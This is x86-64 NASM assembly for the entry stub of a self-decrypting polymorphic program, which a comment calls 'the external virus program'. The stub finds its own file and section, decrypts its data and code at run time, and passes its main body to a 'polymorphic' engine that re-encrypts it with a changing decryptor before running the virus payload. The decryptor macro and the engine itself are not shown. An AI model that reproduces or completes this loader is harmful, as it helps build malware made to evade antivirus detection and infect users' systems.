%include "template.asm.inc"

extern main
extern polymorphic
extern getfilename
extern getsection

extern  data_start_addr
extern  data_size
; Define variables in the data section
section .data
	hello:     db 'Hello world!',10
	helloLen:  equ $-hello

; Code goes in the text section
section .text
	global _start
	global decrypt_engine

align 16
_start:             ; Global entry point


	; save initial program state
	mov rbx, rsp 
	mov r14, rdi
	mov r15, rsi

	; call the function to get the self name from argv[0]
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call getfilename

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the function to get the self name from argv[0]
	call getsection

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; decrypt the .data region
	mov rdi, [data_start_addr]
	mov rsi, [data_size]
	call decrypt_engine

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	mov rdi, main
	mov rsi, _start
	sub rsi, main
	call decrypt_engine

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the polymorphicengine with 3 args
	mov rdi, main
	mov rsi, _start
	sub rsi, main
	mov rdx, decrypt_engine.decryption_function
	call polymorphic

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the external virus program
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call main
	mov rdi, rax
	mov eax, 1
	int 80h


	; ; Terminate program standard nasm way
	; mov eax,1            ; 'exit' system call
	; mov ebx,0            ; exit with error code 0
	; int 80h              ; call the kernel



decrypt_engine:
	; rdi is starting point of decryption
	; rsi is size to be decrypted
    DECRYPTOR_SECTION rdi, rsi
    ret